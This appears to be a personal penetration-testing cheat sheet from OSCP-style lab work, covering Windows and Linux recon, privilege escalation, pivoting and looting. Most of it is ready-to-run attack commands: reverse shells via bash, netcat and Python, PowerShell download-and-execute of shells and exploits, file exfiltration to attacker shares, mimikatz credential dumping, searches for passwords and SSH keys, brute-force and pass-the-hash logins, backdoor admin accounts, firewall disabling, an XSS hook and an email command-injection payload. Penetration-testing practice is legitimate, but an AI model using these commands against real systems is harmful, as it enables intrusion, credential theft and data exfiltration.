TODO: "EasyRMtoMP3 Converter" BOF

**MAIN SCRIPTS**
* ~/scripts/startuptools.sh
* ~/scripts/enum.sh
* ~/scripts/dirtree.py
* ~/scripts/initial-nmap.py
* ~/scripts/targeted_enum.py
* ~/scripts/gobuster_unix.py 
* ~/scripts/gobuster_iis.py


**PASSWORD/USER LISTS**
* /usr/share/ncrack/default.pwd
* /root/oscp/lab-net2019/combo-creds.txt
* /root/AttackScripts/lists/nmap-passwords.lst
* /usr/share/john/password1.lst
* /root/oscp/lab-net2019/hosts/314159265/ssh-default-passwords.txt



**INITIAL SCANS** 

`nmap -oA top1000TCP.nmap -sS -sV -T3 --top-ports 1000 10.11.1.0/24`

`cat top1000.nmap.gnmap | grep "22/open/" | awk '{print $2}'`


**PING SWEEP MANUAL METHOD WITH BASH**
`for i in $(seq 254); do ping 10.10.10.$i -c1 -W1 & done | grep from | awk '{print$4}'|cut -d ":" -f 1`


**PARSE THROUGH GREPPABLE NMAP FOR OPEN PORTS AND THE HOSTS**

`cat top1000.nmap.gnmap | grep "22/open/" | awk '{print $2}'`

**LIST OF FILES TO SEARCH FOR IN PRIV-ESC**


* https://grosquildu.github.io/pentests/web/ 

**RANDOM STUFF**

*Invoke-Command –Computername “BETHANY2”, “Server2” –ScriptBlock {Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value }

powershell "IEX(New-Object Net.Webclient).DownloadString('http://10.110.7.3/priv-esc/Sherlock.ps1')" | Out-File -Encoding UTF8 \\\10.110.7.3\ROPNOP\exfiltrated\sherlockCheck.txt

(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "BETHANY2" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired

(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "BETHANY2" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = 'Alice'; $password = 'aliceishere'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"


powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = 'Alice'; $password = 'aliceishere'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"

>C:\Windows\System32\runas.exe /env /noprofile /user:Alice "c:\test\nc.exe -nc 10.110.7.3 446 -e cmd.exe"

 Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-e","cmd.exe","10.110.7.3","446") -WorkingDirectory C:\Users\Public
 
 %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.Webclient).DownloadString('http://10.110.7.3/shells/Invoke-PowerShellTcp.ps1')"
 
 *

## Windows Search commands

 `findstr /si user  *.xml *.ini *.txt *.config *.cfg *.bat *.php *.asp *.aspx`
 
 `for /f "tokens=2 delims='='" %a in ('sc.exe service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\test\perms.txt`
 
 `for /f eol^=^"^ delims^=^" %a in (.\path.txt) do cmd.exe /c cacls "%a"`
 
  `FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt && FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt`
  
  `echo "y" | .\plink.exe -ssh -l sshuser -pw pass123 10.10.14.17 -R 9445:127.0.0.1:445`
  
  `plink.exe 10.110.7.3 -P 22 -C -R 127.0.0.1:4444:10.11.1.14:445`
  
 
```
dir /s /a /b *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *network*.txt == *.pub == *.cfg == *.pem == *.rar == *.csv == *.xls == *.vbs == *.txt
findstr /spin dbpassword *.* 
findstr /spin password *.*
cd c:\ && findstr /spin "password" *.xml *.ini *.config *.cfg *.bat *.php *.vbs | findstr /liv "\\temp\\" >> c:\temp\pass_all.txt
findstr /spin bankdb *.* & findstr /spin shakan *.* & findstr /spin alice *.* & findstr /spin thinc *.*
findstr /spin "bankdb shakan alice thinc offsec" *.* ----------------THIS SEARCHES FOR ANY STATEMENT LIKE AN OR COMMAND from current DIR
findstr /spin "luigi brett carlp carrie sherlock malroy niky nina pedro pippo sean cory alice" *.*
findstr /spin "luigi brett carlp carrie malroy pippo cory thinc" *.*

```



**WINDOWS PROCESSSES/TASKS**

`tasklist | findstr find` 

`taskkill /F /PID 5856`

**WINDOWS PERMISSIONS**

icacls .\* /GRANT "NINA\Nina":(OI)(CI)F /T /C

**MAIN BAT SCRIPTS TO RECON AND PRIV ESC EVERYTHING**

```
copy \\10.110.7.3\ROPNOP\priv-esc\smb_dl.bat -------------downloads most everything below for windows 
copy \\10.110.7.3\ROPNOP\priv-esc\add_walter_rdp.bat
copy \\10.110.7.3\ROPNOP\priv-esc\windows_recon.bat
copy \\10.110.7.3\ROPNOP\priv-esc\jollykatz\jolly32.bat
copy \\10.110.7.3\ROPNOP\priv-esc\jollykatz\jollykatz64.exe
copy \\10.110.7.3\ROPNOP\priv-esc\jollykatz\jollykatz32.exe
copy \\10.110.7.3\ROPNOP\priv-esc\mimikatz.exe
copy \\10.110.7.3\ROPNOP\priv-esc\PwDump.exe
copy \\10.110.7.3\ROPNOP\priv-esc\Accesschk\accesschk.exe
copy \\10.110.7.3\ROPNOP\priv-esc\Accesschk\accesschk5-2.exe
copy \\10.110.7.3\ROPNOP\priv-esc\Accesschk\accesschk64.exe
copy \\10.110.7.3\ROPNOP\priv-esc\pass_recon.bat
copy \\10.110.7.3\ROPNOP\priv-esc\plink.exe
copy \\10.110.7.3\ROPNOP\priv-esc\srvcheck3.exe
copy \\10.110.7.3\ROPNOP\priv-esc\whoami.exe
copy \\10.110.7.3\ROPNOP\shells\nc.exe 
 
copy \\10.2.2.15\Public\jolly32.bat
copy \\10.2.2.15\Public\jollykatz32.exe
copy \\10.2.2.15\Public\pass_recon.bat 


move *.txt \\10.110.7.3\ROPNOP\exfiltrated
```

**WINDOWS EXPLOIT SUGGESTER**
```
cp systeminfo.txt ~/priv-esc/windows/Windows-Exploit-Suggester-master/
cd /root/priv-esc/windows/Windows-Exploit-Suggester-master/
./windows-exploit-suggester.py --database 2018-09-08-mssb.xls --systeminfo ./systeminfo.txt >> exploits.txt

```




**FTP COMMANDS FROM WINDOWS FOR GETTING FILES** 
```
echo open 10.110.7.3>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get priv-esc/jollykatz/jolly32.bat >>ftp_commands.txt&echo get priv-esc/jollykatz/jollykatz32.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt
echo open 10.110.7.3>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo get t.txt>>ftp_commands.txt&echo bye>>ftp_commands.txt
ftp -s:ftp_commands.txt
```

## Download/Upload Files
**powershell**

`Invoke-WebRequest "http://10.33.30.13/shell449.dll" -Outfile "custom7.dll`


**EXECUTING_**_____________________________________________

`START /MIN /LOW CMD /C %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.Webclient).DownloadString('http://10.110.7.3/shells/Invoke-PowerShellTcp.ps1')"`

**POWERSHELL EXECUTION POLICY**
`Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser`

### Powershell .exe locations

**64 bit**
* %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
* 
**32 bit**
* %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe 

RUNNING TOOLS

`accesschk.exe -uwcqv "Authenticated Users" * /accepteula`


**TESTING CAPTURED CREDS ON A BOX_**

`C:\Windows\System32\runas.exe /env /noprofile /user:Administrator "cmd /c echo test > c:\test.txt"`

**TESTING TO SEE IF WINDOWS IS x64 or x32**
`If "%PROCESSOR_ARCHITEW6432%" == "AMD64" ECHO 32 bit process`

`if ($env:PROCESSOR_ARCHITEW6432 -eq "AMD64") {"32 bit process"}`


**EXPLOITS**
```
copy \\10.110.7.3\ROPNOP\JuicyPotato.exe
copy \\10.110.7.3\ROPNOP\shell-446.exe
copy \\10.110.7.3\ROPNOP\exploits\windows\MS09-012\churrasco.exe
copy \\10.110.7.3\ROPNOP\exploits\windows\MS16-075\Tater.ps1
```


`powershell "IEX(New-Object Net.Webclient).DownloadString('http://10.110.7.3/Tater.ps1')"`

**MIMIKATZ/JOLLYKATZ**

`powershell "IEX(New-Object Net.Webclient).DownloadString('http://10.110.7.3/priv-esc/smb_dl.bat')"`

**EXFILTRATING**

```
findstr /spin "password" *.* >  \\10.110.7.3\ROPNOP\exfiltrated\pass_users.txt

copy *.txt \\10.110.7.3\ROPNOP\exfiltrated\
  
START nc.exe -e cmd.exe 10.110.7.3 443

plink.exe 10.110.7.3 -P 22 -C -R 127.0.0.1:4445:10.11.1.229:445

START echo "y" | .\plink.exe -ssh -l sshuser -pw pass123 10.110.7.3 -R 1081:127.0.0.1:1081
```


**QUICK ESCALATION OR PERSISTENCE**
 
`net user walter P@ssWORD1234 /add && net localgroup Administrators walter /add`

**_________________LOOT WIN 2000__________________________________**

```
copy \\10.110.7.3\ROPNOP\priv-esc\PwDump.exe
copy \\10.110.7.3\ROPNOP\priv-esc\windows_recon_2000.bat
```



**PIVOTING**
* For xp and server 2003
`copy \\10.110.7.3\ROPNOP\priv-esc\3proxy\3proxy-0.8.12-lite\*`

* For vista and up x32 bit
`copy \\10.110.7.3\ROPNOP\priv-esc\3proxy\3proxy_x32\*`

**WINDOWS FIREWALL**
```
NetSh Advfirewall set allprofiles state off
netsh firewall set opmode disable
```







## Linux
 

-------------------------------------**BASH PRIV ESC FILES**------------------------------------------------------------------------
**HTTP SERVER**
```
python -m http.server 80
python -m SimpleHTTPServer
```


```
wget http://10.110.7.3/shells/python-pty-shells/tcp_pty_backconnect.py 
wget http://10.110.7.3/shells/python-pty-shells/tcp_pty_backconnect_myport.py
wget http://10.110.7.3:23/shells/python-pty-shells/tcp_pty_backconnect_myport.py
```

```
python tcp_pty_backconnect.py
python tcp_pty_backconnect_myport.py 21 &
```


**REVERSE SHELLS**
```
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.110.7.3 LPORT=500 -b "\x00" -f elf -o shell-nix
bash -i >& /dev/tcp/10.110.7.3/443 0>&1 &
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.110.7.3 4444 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.3.3.42 23 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.3.3.42",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**LISTENERS**
`socat file:`tty`,echo=0,raw tcp4-listen:21`


**UPGRADE/ESCAPE SHELL/TTY SHELLS** 

`python -c 'import pty;pty.spawn("/bin/bash")'`

`echo os.system('/bin/bash')`

`/usr/bin/perl -e 'exec "/bin/sh";'`

| App| command |
| ------ | ------ |
| nmap | --interactive |  	
| header | header |
| ------ | ------ |
| vi | :!bash |    -->	
| header | header |
| ------ | ------ |
| cell | cell |
| cell | cell |    vi-->	:set shell=/bin/bash:shell
| header | header |
| ------ | ------ |
| cell | cell |
| cell | cell |    awk-->	awk 'BEGIN {system("/bin/bash")}'
| header | header |
| ------ | ------ |
| cell | cell |
| cell | cell |    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
| header | header |
| ------ | ------ |
| cell | cell |
| cell | cell |    perl-->	perl -e 'exec "/bin/bash";'



**LINUX PRIV-ESC SCRIPTS**

```
copy \\10.110.7.3\ROPNOP\priv-esc\LinEnum.sh
copy \\10.110.7.3\ROPNOP\priv-esc\linux-exploit-suggester.sh
copy \\10.110.7.3\ROPNOP\priv-esc\linuxprivchecker1.py
copy \\10.110.7.3\ROPNOP\priv-esc\unix_recon.sh
copy \\10.110.7.3\ROPNOP\priv-esc\unix-privesc-check
copy \\10.110.7.3\ROPNOP\priv-esc\linux-exploit-suggester-2.pl
```


**ONE LINERS TO COPY WITH**

```
echo "wget http://10.110.7.3/priv-esc/unix/LinEnum.sh ; wget http://10.110.7.3/priv-esc/unix/linux-exploit-suggester.sh ; wget http://10.110.7.3/priv-esc/unix/linux-exploit-suggester-2.pl ; wget http://10.110.7.3/priv-esc/unix/unix-privesc-check ; wget http://10.110.7.3/priv-esc//unix/linuxprivchecker1.py ; wget http://10.110.7.3/priv-esc/unix/ftp.sh" > get.sh
echo "wget http://10.110.7.3:22/priv-esc/LinEnum.sh ; wget http://10.110.7.3:22/priv-esc/linux-exploit-suggester.sh ; wget http://10.110.7.3:22/priv-esc/linux-exploit-suggester-2.pl ; wget http://10.110.7.3:22/priv-esc/unix-privesc-check ; wget http://10.110.7.3:22/priv-esc/linuxprivchecker1.py ; wget http://10.110.7.3:22/priv-esc/ftp.sh" > get.sh
bash get.sh
```


**EXECUTING** 

`bash ./LinEnum.sh -s -k password -r linenum -t ; python linuxprivchecker1.py >> linuxprivchecker.txt ; sh unix-privesc-check detailed > unixprivesc.txt ; bash linux-exploit-suggester.sh > linuxexploitsuggester.txt ; perl linux-exploit-suggester-2.pl > linuxexploitsuggester.txt`

**EXFILTRATING**

```
source activate pentest
python -m pyftpdlib -w -p 21
```



`bash ftp.sh`

```
ftp 10.110.7.3 
	cd exfiltrated
	prompt
	mput *.txt
```


**PORT FORWARDING**

`ssh sshuser@10.110.7.3 -p 22 -C -R 127.0.0.1:6631:127.0.0.1:631`

**FTP script FOR LINUX**

```
echo "#!/bin/sh" >> ftp3.sh
echo "HOST='192.168.1.64'" >> ftp3.sh
echo "USER='anonymous'" >> ftp3.sh
echo "PASSWD='blah@blah.com'" >> ftp3.sh
echo "FILE='test.txt'" >> ftp3.sh
echo "" >> ftp3.sh
echo "ftp -n \$HOST <<BLAH " >> ftp3.sh
echo "quote USER \$USER" >> ftp3.sh
echo "quote PASS \$PASSWD" >> ftp3.sh
echo "bin" >> ftp3.sh
echo "get \$FILE" >> ftp3.sh
echo "quit" >> ftp3.sh
echo "BLAH" >> ftp3.sh
echo "exit 0" >> ftp3.sh
```


`echo "#\!/bin/bash" >> ftp.sh ; echo "HOST='10.110.7.3'" >> ftp.sh ; echo "USER='anonymous'" >> ftp.sh ; echo "PASSWD='P@ssWORD1234'" >> ftp.sh ; echo "FILE='*.txt'" >> ftp.sh ; echo "" >> ftp.sh ; echo "ftp -n \$HOST <<EOF " >> ftp.sh  ;echo "quote USER \$USER" >> ftp.sh ; echo "quote PASS \$PASSWD" >> ftp.sh ; echo "bin" >> ftp.sh ; echo "prompt" >>ftp.sh ; echo "mput \$FILE" >> ftp.sh ; echo "quit" >> ftp.sh ; echo "EOF" >> ftp.sh ; echo "exit 0" >> ftp.sh`


**LOOTING SCRIPTS**

```
wget http://10.110.7.3/priv-esc/unix/unix_recon.sh && bash unix_recon.sh 2>/dev/null &
wget http://10.110.7.3/priv-esc/unix_pass_search.sh
```




`<nobody+"|/bin/nc -e /bin/bash 10.3.3.42 23"@localhost>`

`bash unix_pass_search.sh &`

**PACKET CAPTURE**

```
tcpdump -C .5 -s 0 -vv -w cap0-5.pcap host 10.11.1.251 or host 10.1.1.235
echo drywall | sudo tcpdump -ieth0 -C .5 -s 0 -vv -w cap0-5.pcap net 10.11.1.0/24 and port 80 &
```



**PCAP ANALYSIS**

```
tcpdump -r cap0-5.pcap -nn -q ip | awk '{ ip = gensub(/([0-9]+.[0-9]+.[0-9]+.[0-9]+).*/,"\1","g",$3); if(!d[ip]) { print ip; d[ip]=1; fflush(stdout) } }' | sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4
tcpdump -e -vv -nX -r cap1-5.pcap host 10.11.1.251 and port 10443 | grep -i -B 10 "nina"

```

**SUDOERS**

```
echo 'bob ALL=(ALL:ALL) NOPASSWD: ALL'
echo 'j0hn ALL=(ALL) NOPASSWD: ALL'
sudo -l 
```


# BASH search commands

```
find ./ -type f | xargs grep -inoP "administrator.{0,20}"
find /var/www/ -type f -name "*.js" | xargs grep -inoP ".{0,20}password.{0,20}"
find /var/www/ ! -name '*.js' -type f | xargs grep -in password
find /var/www/ -type f \( -iname \*.php -o -iname \*.txt \) | xargs grep -in password
find / -type f \( -iname \*proof.txt -o -iname \*proof.so \)
find / -type f \( -iname \*.pub -o -iname \*id_dsa* -o -iname \*id_rsa \)
find / -type f \( ! -iname \*.js -o -iname \*.php \) -type d \( ! -iname var -o ! -iname temp \) | xargs grep -in password
find / -type f \( ! -iname \*.js -o -iname \*.php \) ! -path "/var/*" ! -path "/usr/*" ! -path "/proc/*" | xargs grep -iInoP ".{0,20}password.{0,20}"
find ./ -type f | xargs grep -i "DB_PASSWORD\|DB_USER" 
dpkg -l || rpm -qa || pkg_info || slapt-get --installed 
find / -perm +43000 -user root -type f -print 2>/dev/null || find / -perm +4sdf00 -user root -type f -print 2>/dev/null || find / -perm +4000 -user root -type f -print 2>/dev/null
```


**LINUX PERMISSIONS**

`sudo find ./ ! -name /etc/sudoers -exec chmod 0777 {} \;`

`find / -writable -xdev -user apache -type d -ls 2>/dev/null`

**INTERESTING FILES**

```
find / -type f 2>/dev/null | xargs grep -i -b "luigi|\brett|\carlp|\carrie|\cory|\sherlock|\malroy|\niky|\nina|\pedro|\pippo\|bankdb\|thinc.local\|shakan\|CSC438\|314159265" >> interesting.txt &
find / -type f 2>/dev/null | xargs grep -i -b "luigi\|carrie"
find / -type f 2>/dev/null | xargs grep -in thinc.local\|shakan\|CSC438\|314159265
LINUX LOOT SSH KEYS
find / -type f \( -iname \*.pub -o -iname \*id_dsa* -o -iname \*id_rsa -o -iname \*dsa*key -o -iname \*rsa*key -o -iname \*ssh*host* \)
find /etc -type f \( -iname \*.pub -o -iname \*id_dsa* -o -iname \*id_rsa -o -iname \*dsa*key -o -iname \*rsa*key -o -iname \*ssh*host* \)
find /etc -type f \( -iname \*.pub -o -iname \*id_dsa* -o -iname \*id_rsa -o -iname \*dsa*key -o -iname \*rsa*key -o -iname \*ssh*host* \) | xargs -I {} cp {} ./
find / -type f \( -iname \*.pub -o -iname \*id_dsa* -o -iname \*id_rsa -o -iname \*dsa*key -o -iname \*rsa*key -o -iname \*ssh*host* \) -exec cp {} ./ \;
find /etc -type f -name "ssh*key*" 
find /root -type f -name "*key*"
find /home -type f -name "*key*"
find / -name "*known*host*" -type f | xargs cat
find / -name "*authorized_keys*" -type f | xargs cat
```



**PASSWD/SHADOW**

`unshadow passwd.txt shadow.txt > unshadowed.txt`

**GOBUSTER**

```
gobuster -k -e -t 100 -r -to 100s -u http://edbmachine.thinc.local -w /root/oscp/lab-net2019/hosts/edbmachine/enum/test/UltimateBeast.lst -o gobuster.txt
gobuster -e -u http://10.110.7.12/ -t 100 -to 100s -w /usr/share/dirb/wordlists/small.txt -k -np -r -x pl,py,php,exe,txt,sh,old,htm,html
gobuster -e -u http://10.110.7.12/ -t 100 -to 100s -w /usr/share/dirb/wordlists/big.txt -k -np -r -x pl,py,php,exe,txt,sh,old -o gobuster.txt
proxychains gobuster -e -u http://10.110.7.12/restricted -t 100 -to 100s -w /usr/share/dirb/wordlists/big.txt -k -np -r -x pl,py,php,exe,txt,sh,old -o gobuster-restricted.txt
cat gobuster5.txt | grep "200\|301\|302\|403" | grep -v "[+]\|?"
```


**NIKTO**
proxychains4 -q -f /etc/proxychains4.conf nikto -h 10.3.3.47 -o nikto.txt

**WORDPRESS**
wpscan --url http://10.10.10.37 --enumerate u,ap,tt,t -o ./wpscan.txt

**METASPLOIT** 
sessions <id>
shell
sysinfo


**XSS INJECTIONS**
<script>alert(3);</script>
<script type=text/javascript src=http://10.110.7.3:3000/hook.js></script>

**SSH**

```
patator ssh_login host=10.11.1.136 port=22 --timeout 30 --threads=5 user=root password=FILE0 0=/root/oscp/lab-net2019/passwords.txt -x ignore:mesg='Authentication failed.'
patator ssh_login keyfile=rsakey.cfg host=FILE0 user=bob 0=/root/oscp/lab-net2019/ssh-open.nmap --max-retries 1 --timeout 100
```

```
proxychains4 -q -f /etc/proxychains4.conf /root/anaconda3/envs/ipykernel_py2/bin/python /root/exploits/ssh/CVE-2018-15473.py --userList /root/oscp/lab-net2019/usernames.txt 10.110.7.11 --port 22 --outputFile sshenumeration.txt --outputFormat list
proxychains python /etc/proxychains4.conf /root/anaconda3/envs/ipykernel_py2/bin/python --userList /usr/share/seclists/Usernames/Names/names.txt 10.1.1.236 --port 22 --outputFile sshenumeration.txt --outputFormat list 2>/dev/null
```


**RDP**

```
patator rdp_login host=10.11.1.230 user=COMBO00 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep='DENIED' --rate-limit=2 --threads=1
patator rdp_login host=FILE0 user='THINC\Administrator' password='te7rpPqBb]7j>46' 0=/root/oscp/lab-net2019/rdpopen.txt -x ignore:fgrep='fail' -x ignore:fgrep='DENIED' --rate-limit=2 --threads=1
ncrack --proxy socks4://127.0.0.1:1081 -vv --user brett --pass ilovesecuritytoo rdp://10.1.1.248
ncrack --proxy socks4://127.0.0.1:1081 -vvv -g cd=2,CL=1,to=10m --user cory -P xac rdp://10.1.1.247
xfreerdp /v:10.1.1.224 -sec-nla /u:""
```



**SMB**

```
smbclient "\\\\10.11.1.136\Bob Share" -u guest ""
patator smb_login host=10.11.1.220 --timeout 100 domain=THINC user=COMBO00 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -l smb_brute --threads=2 --rate-limit=2 -x ignore:mesg='STATUS_LOGON_FAILURE'
cd ~/extra-tools/CrackMapExec
/root/.local/bin/pipenv shell
cme smb 10.11.1.218 -d THINC -u Administrator -H ~/oscp/lab-net2019/ntlm_hashes.txt
nmap -oN smb.nmap --script "smb-* and not smb-brute* and not smb-flood" --script-args=smbusername='robert',smbdomain='thinc.local',smbpassword='!Qwerty^' -d -Pn -sV -T2 -v -p 139,445 10.11.1.220
smbclient "//10.11.1.136/Bob Share" -U thinc/alice
smbclient '\10.11.1.220\SYSVOL' -U='thinc/robert%!Qwerty^' -c 'prompt OFF;recurse ON;lcd './';mget *'
smbclient "\\\\10.2.2.15\Public" --user niky --pass niky -c "put linenum-07-05-19"
smbclient "\\\\10.2.2.15\Public" --user niky --pass niky -c "get 1518.c"
```

**SCP**

```
scp *.txt carrie@10.1.1.236:/home/carrie/ 
scp -P 222 /home/carrie/passwd mario@10.1.1.1:/home/mario/passwd
scp *.txt sshuser@10.110.7.3:/home/sshuser/downloads/
scp root@10.110.7.3:~/linenum.txt .
```



**TELNET**

`proxychains hydra -l james -P ../../passwords.txt 10.2.2.23 telnet`

**PASS THE HASH**

```
crackmapexec 10.11.1.145 -u Administrator -H 84bdd5b71a1a10e58ffdd5d9f1e21885 -x "C:\\Windows\\system32\\cmd.exe /c net user walter P@ssWORD1234 /add"
crackmapexec 10.11.1.145 -u Administrator -H 84bdd5b71a1a10e58ffdd5d9f1e21885 -x "C:\\Windows\system32\\cmd.exe /c net localgroup Administrators walter /add"
crackmapexec 10.11.1.145 -u Administrator -H 50874ce3a20ca3a099ae3e921d824764 -x "C:\\Windows\\system32\\cmd.exe /c icacls c:\\users\\* /GRANT "HELPDESK\\WALTER":(OI)(CI)F /T /C"
```


```
gcc -g -shared -W1,-soname,udf.so -o udf.so udf.o -lc
sudo wget http://10.110.7.3/test.html
sudo mv test.html index.php
```
 


**SENDMAIL CLIENT SIDE**

`sendEmail -t pedro@thinc.local -f malroy@thinc.local -xu malroy@thinc.local -xp P@ssWORD1234 -s 10.11.1.229 -u report -m "my project" -a report.pdf`

**HASH IDENTIFICATION **

`john --rules --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <ENTER HASH FILE HERE>`

**GENERATE PASSWORD LIST**

```
cewl -w customwordlist.txt -d 5 -m 3 http://10.11.1.219/ 
john --wordlist=mariobros.lst --rules --stdout 
```


## Netcat

**NETCAT PORT SCAN**

`nc -z -v 10.1.1.1 23 `

**Start powershell background process for netcat**

`Start-Process -FilePath .\nc.exe -NoNewWindow -ArgumentList("-e","cmd.exe","10.10.14.2",442) -WorkingDirectory C:\temp`




**WFUZZ**

```
wfuzz -c -p 127.0.0.1:1081:SOCKS4 -w /root/oscp/lab-net2019/passwords.txt -H "host: 10.1.1.1" -H "Content-Type: application/x-www-form-urlencoded"  -d "data=FUZZ" http://10.1.1.1/cmd.php
wfuzz -c -p 127.0.0.1:1081:SOCKS4 -w /root/oscp/lab-net2019/hosts/edbmachine/enum/test/allmariostuff.lst -H "host: localhost" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H 'Accept: ""' -H "Content-Type: application/x-www-form-urlencoded" --hc 404 http://luigi.admin.thinc/FUZZ
wfuzz -c -p 127.0.0.1:1081:SOCKS4 -w /root/oscp/lab-net2019/hosts/edbmachine/enum/test/allmariostuff.lst -H "host: localhost" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H 'Accept: ""' -H "Content-Type: application/x-www-form-urlencoded" --hc 404 http://luigi.admin.thinc/FUZZ
```

**PARSING FOR IPs**

`awk '{match($0,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/); ip = substr($0,RSTART,RLENGTH); print ip}' IPSa.txt | grep "." | uniq >> allIPs.txt`

**IPTABLES**

`service iptables stop`


**MSFCONSOLE START LINUX HANDLER**

```
msf exploit(handler) > set LHOST 10.110.7.3
msf exploit(handler) > set LPORT 4445
msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
```


**WHATWEB**

`whatweb -v -a 4 http://10.11.1.115/webmail`


**STUPID SIMPLE ESCALATIONS**

* check the passwd file some user and brute with all the easy password lists, or just try username/password on logins or username/password 
* sudo su to root


**MYSQL COMMAND LINE **

`\! ls -al `

**SQLMAP**

```
proxychains sqlmap -u 'http://10.110.7.25/cat.php?id=1' --privileges
proxychains sqlmap -u 'http://10.110.7.25/cat.php?id=1' --current-user
sqlmap -u 'http://10.110.7.25/cat.php?id=1' -D photoblog --os-shell
sqlmap -u 'http://10.110.7.25/cat.php?id=1' --tables -T users --dump
sqlmap -u 'http://10.110.7.25/cat.php?id=1'
sqlmap -u 'http://10.110.7.25/cat.php?id=1' --tables
```



**CRAWL FOR ALL URLS**

`wget --spider --force-html -r -l2 https://med-transfer01.med.usc.edu  2>&1 | grep '^--' | awk '{ print $3 }' | grep -v '\.\(css\|js\|png\|gif\|jpg\)$' > urls.m3u`


AUTHENTICATING VIA SMB

`/usr/share/doc/python-impacket/examples/psexec.py administrator@10.10.10.97`